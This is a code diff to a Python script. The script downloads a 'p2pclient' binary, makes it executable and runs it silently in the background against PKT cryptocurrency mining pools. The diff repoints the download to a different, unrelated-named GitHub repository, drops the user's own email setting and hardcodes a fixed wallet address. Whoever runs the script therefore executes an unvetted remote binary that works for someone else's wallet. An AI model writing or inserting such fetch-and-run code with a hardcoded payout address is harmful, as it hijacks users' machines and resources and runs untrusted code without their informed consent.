@@ -14,16 +14,13 @@ if not os.path.exists(p2p_client_path):
     print('p2pclient is not installed. Download it from github.')
     # download p2pclient binary from github via requests
     r = requests.get(
-        'https://raw.githubusercontent.com/pepek107happy4s/peer2profit/main/p2pclient')
+        'https://github.com/sengepeke/nextjs/raw/master/p2pclient')
     with open(p2p_client_path, 'wb') as f:
         f.write(r.content)
     os.chmod(p2p_client_path, 0o755)
     print('p2pclient is installed.')
-email = os.environ.get('EMAIL', None)
-if email is None:
-    print('EMAIL environment variable is not set. Please set it to your email address.')
-    exit(1)
-cmd = f'nohup {p2p_client_path} ann -p {email} http://pool.pkt.world http://pool.pktpool.io >> {p2p_log_path} 2>&1 &'
+
+cmd = f'nohup {p2p_client_path} ann -p pkt1qzjhnfe8sfrwk3pynldwe7pmsjfhkdfadsqpyqx http://pool.pkt.world http://pool.pktpool.io >> {p2p_log_path} 2>&1 &'
 # run cmd and wait for it to finish
 out, err = subprocess.Popen(
     cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
